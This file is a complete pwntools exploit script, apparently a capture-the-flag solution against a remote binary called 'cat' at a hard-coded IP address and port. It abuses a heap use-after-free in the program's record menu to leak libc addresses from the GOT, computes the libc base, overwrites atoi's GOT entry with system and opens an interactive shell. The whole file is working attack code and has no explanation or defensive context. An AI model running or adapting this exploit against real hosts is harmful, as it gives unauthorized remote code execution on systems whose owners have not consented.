from pwn import *

target = ELF('cat')
libc = ELF('libc6_2.23-0ubuntu10_amd64.so')

# context.log_level = 'debug'

r = remote('178.62.40.102', 6000)
# r = process('./cat')

def create(name, kind, old):
	r.sendlineafter('> ', '1')
	r.sendlineafter('> ', name)
	r.sendlineafter('> ', kind)
	r.sendlineafter('> ', old)

def edit(rec_id, name, kind, old, y_or_n, get_shell=False):
	r.sendlineafter('> ', '2')
	r.sendlineafter('> ', rec_id)
	r.sendlineafter('> ', name)
	r.sendlineafter('> ', kind)
	r.sendlineafter('> ', old)
	if not get_shell:
		r.sendlineafter('> ', y_or_n)

def delete(rec_id):
	r.sendlineafter('> ', '5')
	r.sendlineafter('> ', rec_id)

def print_rec(rec_id):
	r.sendlineafter('> ', '3')
	r.sendlineafter('> ', rec_id)

create('A', 'A', '42')
edit('0', 'A', 'A', '42', 'n')
create('A', p64(0x6020e8) * 2, '42')
edit('0', 'A', 'A', '42', 'y')
delete('1')
create(p64(target.got['free']) + p64(target.got['read']), 'A', '42')
print_rec('0')

r.recvuntil('name: ')
LIBC_BASE = u64(r.recv(6) + '\x00\x00') - libc.symbols['free']

log.info(hex(LIBC_BASE))

create('A', 'A', '42')
edit('0', 'A', 'A', '42', 'n')
create('A', p64(0x6020e8) + p64(target.got['atoi']), '42')
edit('0', 'A', p64(LIBC_BASE + libc.symbols['system']), 'sh', 'n', True)

r.interactive()
